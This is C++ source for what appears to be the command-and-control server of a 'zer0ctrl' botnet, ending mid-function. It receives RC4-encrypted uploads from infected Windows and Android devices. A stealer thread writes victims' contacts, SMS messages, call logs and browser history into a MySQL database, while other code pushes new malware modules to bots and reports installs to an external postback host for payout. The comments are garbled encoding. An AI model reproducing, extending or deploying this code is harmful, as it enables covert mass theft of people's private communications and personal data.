#include "common.h"
#include "stream.h"
#include <iostream>
#include <iomanip>
#include <limits>

#include "payloads.h"
#include "msgobf.h"
#include "lzma.h"

#define BOTID_SIZE 64

#define OS_WINDOWS  0x01000000
#define OS_MACOS    0x02000000
#define OS_LINUX    0x04000000
#define OS_ANDROID  0x08000000
#define OS_IOS      0x10000000

#define PLATFORM_PC 0x00000001
#define PLATFORM_ANDROID 0x00000004

#define REQUEST_COMMON 0x94d27aa4 // �������� ������, � ������� ���� ������ �������� ������� ��������� �� ����������, ������� � �. �.
#define REQUEST_STEALER 0xb6f34e12 // ����� ��������������� ������ ���������� ������, ��� ������� ��������� ������� � ��������� �������
#define REQUEST_PAYLOAD 0x13B27EB6 // ������ �� �������� ������������ ������.
#define REQUEST_UPLOAD_DATA 0x569EB8B9 // ������ � ������� ��� ���������� � �������� �������.

#define SERVER_GET_INFO 0 // ��������� �� ������� ���������� � ����.
#define SERVER_CHECK_FILE 1 // ������ HEAD �� ��������� ���������� � ����� �� �������.
#define SERVER_DOWNLOAD_FILE 2 // ���������� ����� � �������.
#define SERVER_SEND_FILE 3 // �������� ������/����� �� ������.

namespace zer0ctrl {

class Zer0PartHandler : public Poco::Net::PartHandler
{
public:
	Zer0PartHandler(Poco::UInt32 buildId, Poco::UInt32 dataSize, bool& compressed) :
	_buildId(buildId),
    _dataSize(dataSize),
	_compressed(compressed)
    {
    }

    void handlePart(const Poco::Net::MessageHeader& header, std::istream& stream)
    {
        _type = header.get("Content-Type", "(unspecified)");
        if (header.has("Content-Disposition")) {
            std::string disp;
            Poco::Net::NameValueCollection params;
            Poco::Net::MessageHeader::splitParameters(header["Content-Disposition"], disp, params);
            _name = params.get("name", "(unnamed)");
            _fileName = params.get("filename", "(unnamed)");
			//std::cout << "Multipart name: " << _name << ", filename: " << _fileName << std::endl;
        }

        if (_name.empty()) {
            throw Poco::RuntimeException("No paramname in HTMLForm message header");
        }

		if (_buildId == 0) {
			std::string dd = MsgObf::deobfuscateData(_name);
			//std::cout << "Deobfuscated Build ID: " << dd << std::endl;
			if (!Poco::NumberParser::tryParseUnsigned(dd, _buildId) || _buildId == 0) {
				throw Poco::DataFormatException("Incorrect build ID in deobfuscated data");
			}
		}

        ZBuffer* pZtable = Globals::getInstance()->getZtableForId(_buildId);
        if (pZtable == 0) {
            throw Poco::DataFormatException("Ztable not found for ID: " + Poco::NumberFormatter::format(_buildId));
        }
        
        _inBuffer = new Poco::UInt8[_dataSize];
        Poco::MemoryOutputStream outStream((char*)_inBuffer, _dataSize);
        Poco::StreamCopier::copyStream(stream, outStream);
        Poco::UInt8* outBuffer = 0;
		Poco::UInt32 outSize = _dataSize;

		Poco::UInt32 countedSize = (Poco::UInt32)outStream.charsWritten();
		Globals::arc4(_inBuffer, countedSize, pZtable->begin(), pZtable->size());
		

		Poco::StringTokenizer fnameParts(_fileName, ".", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);
		_compressed = true;
		if (fnameParts.count() == 2 && fnameParts[1] == "7z") {
			_compressed = false;
		}
		if (_compressed) {
			if (!lzma_auto_decode(_inBuffer, countedSize, &outBuffer, &outSize) || outSize != _dataSize) {
				delete[] _inBuffer;
				delete[] outBuffer;
				throw Poco::RuntimeException("Cannot decompress buffer or buffer currupted");
			}

			_zer0Stream.write(outBuffer, outSize);
		}
		else  {
			_zer0Stream.write(_inBuffer, countedSize);
		}
		delete[] _inBuffer;
        _zer0Stream.gotoBegin();
        delete[] outBuffer;
    }

    const std::string& name() const
    {
        return _name;
    }

    const std::string& fileName() const
    {
        return _fileName;
    }

    const std::string& contentType() const
    {
        return _type;
    }

    std::string _type;
    std::string _name;
    std::string _fileName;
    Poco::UInt8* _inBuffer;
	Poco::UInt32 _buildId;
    Poco::UInt32 _dataSize;
    Zer0Stream _zer0Stream;
	bool& _compressed;
};

class ModuleInfo
{
public:
    ModuleInfo(Poco::UInt64 moduleId = 0, Poco::UInt32 hash = 0, Poco::UInt32 version = 0, Poco::UInt32 status = 0, Poco::UInt32 priority = 0) :
    _moduleId(moduleId),
    _hash(hash),
    _version(version),
    _status(status),
    _priority(priority)
    {
    }

    ModuleInfo(const ModuleInfo& other)
    {
        operator=(other);
    }

    const ModuleInfo& operator=(const ModuleInfo& other)
    {
        _moduleId = other._moduleId;
        _hash = other._hash;
        _version = other._version;
        _status = other._status;
        _priority = other._priority;
        return *this;
    }

    Poco::UInt64 _moduleId;
    Poco::UInt32 _hash;
    Poco::UInt32 _version;
    Poco::UInt32 _status;
    Poco::UInt32 _priority;
};


class StealerThread : public Poco::Runnable
{
public:
    StealerThread() :
    _shouldStop(false)
    {
        _pGlobals = Globals::getInstance();
    }

    ~StealerThread()
    {

    }

    static StealerThread* getInstance()
    {
        static Poco::SingletonHolder<StealerThread> singleton;
        return singleton.get();
    }

    void start()
    {
        _thread.start(*this);
    }

    void stop()
    {
        _shouldStop = true;
        _thread.join(7000);
    }

    void processRequest(Poco::UInt64 nuid, Poco::UInt32 buildId, Poco::UInt32 subId, Poco::UInt32 platformId, Poco::UInt32 timenow, Zer0Stream& inStream, Zer0Stream& outStream)
    {
        StealerData* pData = new StealerData;
        pData->nuid = nuid;
        pData->buildId = buildId;
        pData->subId = subId;
        pData->platformId = platformId;
        pData->timenow = timenow;
        pData->jsonInfo = inStream.readBinaryString();
        pData->jsonApps = inStream.readBinaryString();
        pData->jsonContacts = inStream.readBinaryString();
        pData->jsonMessages = inStream.readBinaryString();
        pData->jsonBrowHistory = inStream.readBinaryString();
        pData->jsonCalls = inStream.readBinaryString();

        {
            Poco::ScopedLock<Poco::FastMutex> lock(_mutex);
            _list.push_back(pData);
        }

        outStream.writeDword(1);
    }

private:
    struct StealerData
    {
        Poco::UInt64 nuid;
        Poco::UInt32 buildId;
        Poco::UInt32 subId;
        Poco::UInt32 platformId;
        Poco::UInt32 timenow;
        std::string jsonInfo;
        std::string jsonApps;
        std::string jsonContacts;
        std::string jsonMessages;
        std::string jsonBrowHistory;
        std::string jsonCalls;
    };

    void run()
    {
        while (!_shouldStop) {
            Poco::Thread::sleep(1000);

            while (_list.size() > 0) {
                StealerData* pData = _list.front();
                _mutex.lock();
                _list.pop_front();
                _mutex.unlock();
                
                try {
                    processData(pData);
                }
                catch (Poco::Exception& exc) {
                    Poco::Util::Application::instance().logger().error(exc.displayText());
                }

                delete pData;
            }
        }
    }

    void processData(StealerData* pData)
    {
        Poco::Data::Session session = _pGlobals->_pMysqlPool->get();
        try {
            Poco::Data::Statement insert(session);
            insert << "UPDATE nodes SET last_tm=?,info=?,apps=? WHERE node_id=?",
                Poco::Data::Keywords::use(pData->timenow),
                Poco::Data::Keywords::use(pData->jsonInfo),
                Poco::Data::Keywords::use(pData->jsonApps),
                Poco::Data::Keywords::use(pData->nuid);
            insert.execute();
        }
        catch (Poco::Exception& e) {
        //    std::cout << e.displayText() << std::endl;
        }

        if (!pData->jsonContacts.empty()) {
            try {
                Poco::JSON::Parser parser;
                Poco::Dynamic::Var result = parser.parse(pData->jsonContacts);
                Poco::JSON::Array::Ptr arr = result.extract<Poco::JSON::Array::Ptr>();
                for (size_t i = 0; i < arr->size(); ++i) {
                    Poco::JSON::Object::Ptr object = arr->getObject(i);

                    std::string name = object->getValue<std::string>("name");
                    std::string note, addr, addrType;

                    Poco::Data::Statement select(session);
                    Poco::UInt64 contactId = 0;

                    select << "SELECT contact_id from contacts WHERE name=? AND node_id=?", Poco::Data::Keywords::into(contactId), Poco::Data::Keywords::use(name), Poco::Data::Keywords::use(pData->nuid);
                    select.execute();


                    if (object->has("note")) {
                        note = object->getValue<std::string>("note");
                    }
                    if (object->has("addr")) {
                        addr = object->getValue<std::string>("addr");
                        Poco::StringTokenizer parts(addr, "|", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);
                        if (parts.count() == 2) {
                            addrType = parts[0];
                            addr = parts[1];
                        }
                        else if (parts.count() == 1) {
                            addr = parts[0];
                        }
                    }

                {
                    Poco::Data::Statement insert(session);
                    if (contactId == 0) {
                        insert << "INSERT INTO contacts (node_id,name,note,addr,addr_type) VALUES(?,?,?,?,?);",
                            Poco::Data::Keywords::use(pData->nuid),
                            Poco::Data::Keywords::use(name),
                            Poco::Data::Keywords::use(note),
                            Poco::Data::Keywords::use(addr),
                            Poco::Data::Keywords::use(addrType);
                        insert.execute();
                        session << "SELECT LAST_INSERT_ID()", Poco::Data::Keywords::into(contactId), Poco::Data::Keywords::now;
                    }
                    else {
                        insert << "UPDATE contacts SET name=?,addr=?,addr_type=?,note=? WHERE contact_id=?",
                            Poco::Data::Keywords::use(name),
                            Poco::Data::Keywords::use(addr),
                            Poco::Data::Keywords::use(addrType),
                            Poco::Data::Keywords::use(note),
                            Poco::Data::Keywords::use(contactId);
                        insert.execute();
                    }
                }

                    if (object->has("phone")) {
                        std::string phone = object->getValue<std::string>("phone");
                        Poco::StringTokenizer phones(phone, ";", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);

                        for (int n = 0; n < phones.count(); ++n) {
                            Poco::StringTokenizer parts(phones[n], "|", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);

                            if (parts.count() > 0) {
                                std::string phoneNumber, phoneType;
                                if (parts.count() == 2) {
                                    phoneType = parts[0];
                                    phoneNumber = parts[1];
                                }
                                else if (parts.count() == 1) {
                                    phoneNumber = parts[0];
                                }

                                Poco::replaceInPlace(phoneNumber, " ", "");
                                Poco::replaceInPlace(phoneNumber, "(", "");
                                Poco::replaceInPlace(phoneNumber, ")", "");
                                Poco::replaceInPlace(phoneNumber, "-", "");

                                Poco::Data::Statement insert(session);
                                insert << "INSERT INTO contacts_phone_numbers (contact_id, number, type) VALUES(?,?,?) ON DUPLICATE KEY UPDATE type=?",
                                    Poco::Data::Keywords::use(contactId),
                                    Poco::Data::Keywords::use(phoneNumber),
                                    Poco::Data::Keywords::use(phoneType),
                                    Poco::Data::Keywords::use(phoneType);
                                insert.execute();
                            }
                        }
                    }

                    if (object->has("email")) {
                        std::string email = object->getValue<std::string>("email");
                        Poco::StringTokenizer emails(email, ";", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);

                        for (int n = 0; n < emails.count(); ++n) {
                            Poco::StringTokenizer parts(emails[n], "|", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);
                            if (parts.count() > 0) {
                                std::string emailType;
                                email.clear();
                                if (parts.count() == 2) {
                                    emailType = parts[0];
                                    email = parts[1];
                                }
                                else if (parts.count() == 1) {
                                    email = parts[0];
                                }

                                Poco::Data::Statement insert(session);
                                insert << "INSERT INTO contacts_emails (contact_id, email, type) VALUES(?,?,?) ON DUPLICATE KEY UPDATE type=?",
                                    Poco::Data::Keywords::use(contactId),
                                    Poco::Data::Keywords::use(email),
                                    Poco::Data::Keywords::use(emailType),
                                    Poco::Data::Keywords::use(emailType);
                                insert.execute();
                            }
                        }
                    }

                    if (object->has("im")) {
                        std::string im = object->getValue<std::string>("im");
                        Poco::StringTokenizer ims(im, ";", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);

                        for (int n = 0; n < ims.count(); ++n) {
                            Poco::StringTokenizer parts(ims[n], "|", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);
                            if (parts.count() > 0) {
                                std::string imType, imProto;
                                im.clear();
                                if (parts.count() == 3) {
                                    imType = parts[0];
                                    imProto = parts[1];
                                    im = parts[2];
                                }
                                else if (parts.count() == 2) {
                                    imProto = parts[0];
                                    im = parts[1];
                                }
                                else if (parts.count() == 1) {
                                    im = parts[0];
                                }

                                Poco::Data::Statement insert(session);
                                insert << "INSERT INTO contacts_ims (contact_id,data,type,protocol) VALUES(?,?,?,?) ON DUPLICATE KEY UPDATE type=?,protocol=?",
                                    Poco::Data::Keywords::use(contactId),
                                    Poco::Data::Keywords::use(im),
                                    Poco::Data::Keywords::use(imType),
                                    Poco::Data::Keywords::use(imProto),
                                    Poco::Data::Keywords::use(imType),
                                    Poco::Data::Keywords::use(imProto);
                                insert.execute();
                            }
                        }
                    }
                }
            }
            catch (Poco::Exception& e) {
            //    std::cout << e.displayText() << std::endl;
            }
        }

        if (!pData->jsonMessages.empty()) {
            try {
                Poco::JSON::Parser parser;
                Poco::Dynamic::Var result = parser.parse(pData->jsonMessages);
                Poco::JSON::Array::Ptr arr = result.extract<Poco::JSON::Array::Ptr>();
                for (size_t i = 0; i < arr->size(); ++i) {
                    Poco::JSON::Object::Ptr object = arr->getObject(i);

                    Poco::UInt32 id = 0, type, tm;
                    std::string body, addr;

                    try {
                        if (object->has("id")) {
                            id = object->getValue<Poco::UInt32>("id");
                        }
                        tm = object->getValue<Poco::UInt32>("time");
                        type = object->getValue<Poco::UInt32>("folder");
                        body = object->getValue<std::string>("body");
                        addr = object->getValue<std::string>("addr");

                        Poco::Data::Statement insert(session);
                        insert << "INSERT INTO smses (node_id,type,addr,tm,body,id) VALUES(?,?,?,?,?,?);",
                            Poco::Data::Keywords::use(pData->nuid),
                            Poco::Data::Keywords::use(type),
                            Poco::Data::Keywords::use(addr),
                            Poco::Data::Keywords::use(tm),
                            Poco::Data::Keywords::use(body),
                            Poco::Data::Keywords::use(id);
                        insert.execute();
                    }
                    catch (Poco::Exception& exc) {
                    //    Poco::Util::Application::instance().logger().error(exc.displayText());
                    }
                }
            }
            catch (Poco::Exception& e) {
            //    std::cout << e.displayText() << std::endl;
            }
        }

        if (!pData->jsonBrowHistory.empty()) {
            try {
                Poco::JSON::Parser parser;
                Poco::Dynamic::Var result = parser.parse(pData->jsonBrowHistory);
                Poco::JSON::Array::Ptr arr = result.extract<Poco::JSON::Array::Ptr>();
                for (size_t i = 0; i < arr->size(); ++i) {
                    Poco::JSON::Object::Ptr object = arr->getObject(i);

                    Poco::UInt32 val;
                    std::string visits, tm, title, url;

                    try {
                        if (object->has("time")) {
                            val = object->getValue<Poco::UInt32>("time");
                            tm = Poco::NumberFormatter::format(val);
                        }

                        if (object->has("visits")) {
                            val = object->getValue<Poco::UInt32>("visits");
                            visits = Poco::NumberFormatter::format(val);
                        }

                        if (object->has("title")) {
                            title = object->getValue<std::string>("title");
                        }

                        url = object->getValue<std::string>("url");

                        Poco::Data::Statement insert(session);
                        insert << "INSERT INTO browser_histories (node_id,url,title,lastvisit_tm,visits) VALUES(?,?,?,?,?) ON DUPLICATE KEY UPDATE title=?,lastvisit_tm=?,visits=?",
                            Poco::Data::Keywords::use(pData->nuid),
                            Poco::Data::Keywords::use(url),
                            Poco::Data::Keywords::use(title),
                            Poco::Data::Keywords::use(tm),
                            Poco::Data::Keywords::use(visits),
                            Poco::Data::Keywords::use(title),
                            Poco::Data::Keywords::use(tm),
                            Poco::Data::Keywords::use(visits);
                        insert.execute();
                    }
                    catch (Poco::Exception& exc) {
                    //    Poco::Util::Application::instance().logger().error(exc.displayText());
                    }
                }
            }
            catch (Poco::Exception& e) {
            //    std::cout << e.displayText() << std::endl;
            }
        }

        if (!pData->jsonCalls.empty()) {
            try {
                Poco::JSON::Parser parser;
                Poco::Dynamic::Var result = parser.parse(pData->jsonCalls);
                Poco::JSON::Array::Ptr arr = result.extract<Poco::JSON::Array::Ptr>();
                for (size_t i = 0; i < arr->size(); ++i) {
                    Poco::JSON::Object::Ptr object = arr->getObject(i);

                    Poco::UInt32 duration = 0, type, tm;
                    std::string number, name;

                    try {
                        if (object->has("durat")) {
                            duration = object->getValue<Poco::UInt32>("durat");
                        }
                        tm = object->getValue<Poco::UInt32>("time");
                        type = object->getValue<Poco::UInt32>("type");
                        if (object->has("name")) {
                            name = object->getValue<std::string>("name");
                        }
                        number = object->getValue<std::string>("number");

                        Poco::Data::Statement insert(session);
                        insert << "INSERT INTO calls (node_id,type,number,tm,name,duration) VALUES(?,?,?,?,?,?) ON DUPLICATE KEY UPDATE name=?",
                            Poco::Data::Keywords::use(pData->nuid),
                            Poco::Data::Keywords::use(type),
                            Poco::Data::Keywords::use(number),
                            Poco::Data::Keywords::use(tm),
                            Poco::Data::Keywords::use(name),
                            Poco::Data::Keywords::use(duration),
                            Poco::Data::Keywords::use(name);
                        insert.execute();
                    }
                    catch (Poco::Exception& exc) {
                    //    Poco::Util::Application::instance().logger().error(exc.displayText());
                    }
                }
            }
            catch (Poco::Exception& e) {
            //    std::cout << e.displayText() << std::endl;
            }
        }
    }

    bool _shouldStop;
    Globals* _pGlobals;
    Poco::Thread _thread;
    std::list<StealerData*> _list;
    Poco::FastMutex _mutex;
};



class PostbackThread : public Poco::Runnable
{
public:
	PostbackThread() :
	_shouldStop(false)
	{
		_pGlobals = Globals::getInstance();
	}

	~PostbackThread()
	{

	}

	static PostbackThread* getInstance()
	{
		static Poco::SingletonHolder<PostbackThread> singleton;
		return singleton.get();
	}

	void start()
	{
		_thread.start(*this);
	}

	void stop()
	{
		_shouldStop = true;
		_thread.join(7000);
	}

	void postback(std::string& query)
	{
		Poco::ScopedLock<Poco::FastMutex> lock(_mutex);
		_list.push_back(query);
		std::cout << "---------- Postback pushed: " << query << std::endl;
	}

private:
	void run()
	{
		while (!_shouldStop) {
			Poco::Thread::sleep(1000);

			while (_list.size() > 0) {
				std::string q = _list.front();
				_mutex.lock();
				_list.pop_front();
				_mutex.unlock();

				try {
					std::string httpUri = "http://so8in.privilegeschum.com/postback?payout=0&txid=INSTALL&vid=";
					Poco::StringTokenizer vars(q, "&", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);
					for (int i = 0; i < vars.count(); ++i) {
						Poco::StringTokenizer keyVal(vars[i], "=", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);
						if (keyVal[0] == "vid") {
							httpUri += keyVal[1];
							break;
						}
					}

					Poco::URI uri(httpUri);
					Poco::Net::HTTPClientSession session(uri.getHost(), uri.getPort());
					Poco::Net::HTTPRequest req(Poco::Net::HTTPRequest::HTTP_GET, uri.getPathAndQuery(), Poco::Net::HTTPMessage::HTTP_1_1);
					Poco::Net::HTTPResponse res;
					session.sendRequest(req);
					std::istream& rs = session.receiveResponse(res);
					Poco::NullOutputStream nulls;
					std::stringstream ss;
					Poco::StreamCopier::copyStream(rs, ss);
					std::string sss = ss.str();
					std::cout << "---------- Postback: " << sss << std::endl;
				}
				catch (Poco::Exception& exc) {
					std::cout << "---------- Postback: failed"<< std::endl;
					Poco::Util::Application::instance().logger().error(exc.displayText());
				}
			}
		}
	}

	bool _shouldStop;
	Globals* _pGlobals;
	Poco::Thread _thread;
	std::list<std::string> _list;
	Poco::FastMutex _mutex;
};

class ZRequestHandler : public Poco::Net::HTTPRequestHandler
{
public:
    ZRequestHandler() :
    _dbNodeId(0),
	_coreVersion(0),
    _dbCreateTm(0)
    {
        _pGlobals = Globals::getInstance();
    }

    std::string nodeCreateToken()
    {
        std::string token;
        Poco::Random rnd;

        token.resize(64);

        for (int i = 0; i < 64; ++i) {
            char ch;
            do {
                ch = rnd.nextChar();
            } while (ch == '\0' || ch == '\'' || ch == '"' || ch == '\n' || ch == '\r' || ch == '\b' || ch == '\t' || ch == '\\');
            token[i] = ch;
        }

        return token;
    }

    bool isModuleExists(Poco::UInt32 hash, Poco::UInt32 ver)
    {
        Poco::File moduleFile(_pGlobals->_modulesPath + "/" + Poco::NumberFormatter::format(_platformId) + "/" + Poco::toLower(Poco::NumberFormatter::formatHex(hash, 8)) + "." + Poco::toLower(Poco::NumberFormatter::formatHex(ver, 8)));
        return (moduleFile.exists() && moduleFile.getSize() > 0);
    }

    void updateInfo(Poco::Data::Session& session, Zer0Stream& outStream)
    {
        {
            Poco::Data::Statement insert(session);

            // ��� ��������� �������� _osLang ����������� �����, ���������� ������������� ��� � ��������������.
            if (_platformId == PLATFORM_ANDROID) {
                std::string shortName;
                shortName.resize(2);
                memcpy(&shortName[0], &_osLang, 2);
                if (*((Poco::UInt16*)(&_osLang) + 1) != 0) {
                    shortName.resize(5);
                    shortName[2] = '-';
                    memcpy(&shortName[3], (Poco::UInt16*)(&_osLang) + 1, 2);
                }

                _osLang = 9; // en - ��-���������

                // ����������� ������ � ���� �� ��.
    #ifdef _WIN32
                _snprintf(_query, 1024,
    #else
                snprintf(_query, 1024,
    #endif // _WIN32
                    "SELECT os_lang_id FROM os_langs WHERE short_name='%.5s'",
                    shortName.c_str());

                session << _query,
                    Poco::Data::Keywords::into(_osLang),
                    Poco::Data::Keywords::now;
            }

            if (_dbNodeId == 0) { // ����� ���.
                // ������ token ��� ����.
                _dbNToken = nodeCreateToken();

                insert << "INSERT INTO nodes(uniqid,token, build_id,sub_id,platform_id,os_id,os_lang_id,country_id,create_tm,last_tm,ip,sec_mask,hips_mask,account_name,device_manufacturer,device_model,network_operator,network_type,network_country,network_simstate,trackinfo) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                    Poco::Data::Keywords::use(_botId),
                    Poco::Data::Keywords::use(_dbNToken),
                    Poco::Data::Keywords::use(_buildId),
                    Poco::Data::Keywords::use(_subId),
                    Poco::Data::Keywords::use(_platformId),
                    Poco::Data::Keywords::use(_osId),
                    Poco::Data::Keywords::use(_osLang),
                    Poco::Data::Keywords::use(_countryId),
                    Poco::Data::Keywords::use(_timenow),
                    Poco::Data::Keywords::use(_timenow),
                    Poco::Data::Keywords::use(_botIp),
                    Poco::Data::Keywords::use(_secMask),
                    Poco::Data::Keywords::use(_hipsMask),
					Poco::Data::Keywords::use(_account),
					Poco::Data::Keywords::use(_manufacturer),
					Poco::Data::Keywords::use(_model),
					Poco::Data::Keywords::use(_networkOperator),
					Poco::Data::Keywords::use(_networkType),
					Poco::Data::Keywords::use(_networkCountry),
					Poco::Data::Keywords::use(_simState),
					Poco::Data::Keywords::use(_trackInfo);
				insert.execute();
                _dbCreateTm = _timenow;

				if (_coreVersion >= 0x00000240) {
					Poco::UInt64 newNodeId = 0;
					Poco::Data::Statement idselStmt(session);
					idselStmt << "SELECT node_id FROM nodes WHERE uniqid=?",
						Poco::Data::Keywords::into(newNodeId),
						Poco::Data::Keywords::use(_botId);
					idselStmt.execute();
					Poco::Data::Statement stuStmt(session);
					stuStmt << "INSERT INTO node_locks SET node_id=?, lockstatus_id=1,update_tm=UNIX_TIMESTAMP()", Poco::Data::Keywords::use(newNodeId);
					stuStmt.execute();
				}

				PostbackThread::getInstance()->postback(_trackInfo);
            }
            else {
                insert << "UPDATE nodes SET os_id=?,os_lang_id=?,country_id=?,ip=?,last_tm=?,sec_mask=?,hips_mask=?,account_name=?,build_id=?,sub_id=?,network_operator=?,network_type=?,network_country=?,network_simstate=?,trackinfo=? WHERE node_id=?",
                    Poco::Data::Keywords::use(_osId),
                    Poco::Data::Keywords::use(_osLang),
                    Poco::Data::Keywords::use(_countryId),
                    Poco::Data::Keywords::use(_botIp),
                    Poco::Data::Keywords::use(_timenow),
                    Poco::Data::Keywords::use(_secMask),
                    Poco::Data::Keywords::use(_hipsMask),
					Poco::Data::Keywords::use(_account),
                    Poco::Data::Keywords::use(_buildId),
                    Poco::Data::Keywords::use(_subId),
					Poco::Data::Keywords::use(_networkOperator),
					Poco::Data::Keywords::use(_networkType),
					Poco::Data::Keywords::use(_networkCountry),
					Poco::Data::Keywords::use(_simState),
					Poco::Data::Keywords::use(_trackInfo),
                    Poco::Data::Keywords::use(_dbNodeId);
				insert.execute();

				if (_coreVersion >= 0x00000240) {
					Poco::UInt64 lockNodeId = 0;
					Poco::Data::Statement nlselStmt(session);
					nlselStmt << "SELECT node_id FROM node_locks WHERE node_id=?",
						Poco::Data::Keywords::into(lockNodeId),
						Poco::Data::Keywords::use(_dbNodeId);
					nlselStmt.execute();
					if (lockNodeId == 0) {
						Poco::Data::Statement stuStmt(session);
						stuStmt << "INSERT INTO node_locks SET node_id=?, lockstatus_id=1,update_tm=UNIX_TIMESTAMP()", Poco::Data::Keywords::use(_dbNodeId);
						stuStmt.execute();
					}
				}
            }
        }

        std::vector<Poco::UInt64> moduleIds;
        std::vector<Poco::UInt32> hashes;
        std::vector<Poco::UInt32> versions;
        std::vector<Poco::UInt32> priorities;
        ModuleInfo* coreModule = 0;

#ifdef _WIN32
        _snprintf(_query, 1024,
#else
        snprintf(_query, 1024,
#endif // _WIN32
            "SELECT module_id,hash,version,priority FROM modules m1 WHERE platform_id=%u AND core_version<=%u AND core_version=(SELECT MAX(core_version) FROM modules m2 WHERE m1.platform_id=m2.platform_id AND m1.hash=m2.hash)",
            _platformId, _modules.at(0)._version);

        session << _query, Poco::Data::Keywords::into(moduleIds), Poco::Data::Keywords::into(hashes), Poco::Data::Keywords::into(versions), Poco::Data::Keywords::into(priorities), Poco::Data::Keywords::now;

        std::vector<ModuleInfo> dbModules;
        if (moduleIds.size() > 0) {
            for (int i = 0; i < moduleIds.size(); ++i) {
                dbModules.push_back(ModuleInfo(moduleIds.at(i), hashes.at(i), versions.at(i), 0, priorities.at(i)));
            }
        }

        for (std::vector<ModuleInfo>::iterator itr = _modules.begin(); itr != _modules.end(); ++itr) {
            std::vector<ModuleInfo>::iterator dbItr;
            for (dbItr = dbModules.begin(); dbItr != dbModules.end(); ++dbItr) {
                if (itr->_hash == dbItr->_hash) {
                    itr->_moduleId = dbItr->_moduleId;

                    Poco::Data::Statement insert(session);

                    insert << "INSERT INTO nodes_modules (node_id,hash,version,enabled,update_tm) VALUES(?,?,?,?,UNIX_TIMESTAMP()) ON DUPLICATE KEY UPDATE version=?,enabled=?,update_tm=UNIX_TIMESTAMP()",
                        Poco::Data::Keywords::use(_dbNodeId),
                        Poco::Data::Keywords::use(itr->_hash),
                        Poco::Data::Keywords::use(itr->_version),
                        Poco::Data::Keywords::use(itr->_status),
                        Poco::Data::Keywords::use(itr->_version),
                        Poco::Data::Keywords::use(itr->_status);
                    insert.execute();

                    break;
                }
            }
        }

        std::vector<ModuleInfo> newModules;

        // Update modules info
        for (std::vector<ModuleInfo>::iterator dbItr = dbModules.begin(); dbItr != dbModules.end(); ++dbItr) {
            std::vector<ModuleInfo>::iterator itr;
            for (itr = _modules.begin(); itr != _modules.end(); ++itr) {
                if (itr->_hash == dbItr->_hash) {
                    if (itr->_version < dbItr->_version && isModuleExists(dbItr->_hash, dbItr->_version)) {
                        newModules.push_back(*dbItr);
                    }

                    break;
                }
            }

            if (itr == _modules.end() && isModuleExists(dbItr->_hash, dbItr->_version)) {
                newModules.push_back(*dbItr);
            }
        }

#ifdef _WIN32
        _snprintf(_query, 1024,
#else
        snprintf(_query, 1024,
#endif // _WIN32
            "SELECT cc,cn FROM countries WHERE country_id=%u",
            _countryId);

        session << _query, Poco::Data::Keywords::into(_countryCode), Poco::Data::Keywords::into(_country), Poco::Data::Keywords::now;

        // ��������� ����� � ��������� �������:
        outStream.writeDword(_dbCreateTm); // create_tm
        outStream.writeDword(_timenow); // update_tm
        outStream.writeBinaryString(_sBotIp); // IP
        outStream.writeBinaryString(_countryCode); // Country Code
        outStream.writeBinaryString(_country); // Country
        outStream.write(&_dbNToken[0], 64); // Node Token
        // ������ �������.
        outStream.writeDword((Poco::UInt32)newModules.size());
        for (std::vector<ModuleInfo>::iterator itr = newModules.begin(); itr != newModules.end(); ++itr) {
            outStream.writeDword(itr->_hash);
            outStream.writeDword(itr->_version);
            outStream.writeDword(itr->_priority);
            std::string fileData;
            std::string fileName = _pGlobals->_modulesPath + "/" + Poco::NumberFormatter::format(_platformId) + "/" + Poco::toLower(Poco::NumberFormatter::formatHex(itr->_hash, 8)) + "." + Poco::toLower(Poco::NumberFormatter::formatHex(itr->_version, 8));
            _pGlobals->readFile(fileName, fileData);
            outStream.writeDword(fileData.size());
            outStream.write(&fileData[0], fileData.size());
        }
    }

    std::string normalize(const std::string& str)
    {
        std::string ret;
        for (std::string::const_iterator itr = str.begin(); itr != str.end(); ++itr) {
            char ch = *itr;

            if ((ch < 'a' || ch > 'z') && (ch < 'A' || ch > 'Z') && (ch < '0' || ch > '9') && ch != '/' && ch != '#' &&
                ch != '-' && ch != '.' && ch != '(' && ch != ')' && ch != '`' && ch != ' ' && ch != ',' &&
                ch != '$' && ch != '!' && ch != '^' && ch != '*' && ch != '@' && ch != ':' && ch != ';') {
                ch = '_';
            }
            ret += ch;
        }

        return ret;
    }

	void logFailedRequest(Poco::Data::Session& dbSession, std::string& excMsg, Poco::Net::HTTPServerRequest& request)
	{
		try {
			Poco::Data::Statement insert(dbSession);
			std::stringstream ssHttpHeaders;
			Poco::Net::NameValueCollection::ConstIterator it = request.begin();
			Poco::Net::NameValueCollection::ConstIterator end = request.end();
			for (; it != end; ++it) {
				ssHttpHeaders << it->first << ": " << it->second << "\n";
			}
			std::string httpHeaders = ssHttpHeaders.str();
			std::string ip = request.get("X-Real-IP");
			std::string cc = request.get("X-Country");
			insert << "INSERT INTO failed_requests(ip,cc,err_msg,tm,http_headers) VALUES(?,?,?,UNIX_TIMESTAMP(),?) ON DUPLICATE KEY UPDATE tm=UNIX_TIMESTAMP(),cc=?,err_msg=?,http_headers=?",
				Poco::Data::Keywords::use(ip),
				Poco::Data::Keywords::use(cc),
				Poco::Data::Keywords::use(excMsg),
				Poco::Data::Keywords::use(httpHeaders),
				Poco::Data::Keywords::use(cc),
				Poco::Data::Keywords::use(excMsg),
				Poco::Data::Keywords::use(httpHeaders);
			insert.execute();
		}
		catch (Poco::Exception& exc1) {
			Poco::Util::Application::instance().logger().error(exc1.displayText());
		}
	}

    void handleRequest(Poco::Net::HTTPServerRequest& request, Poco::Net::HTTPServerResponse& response)
    {
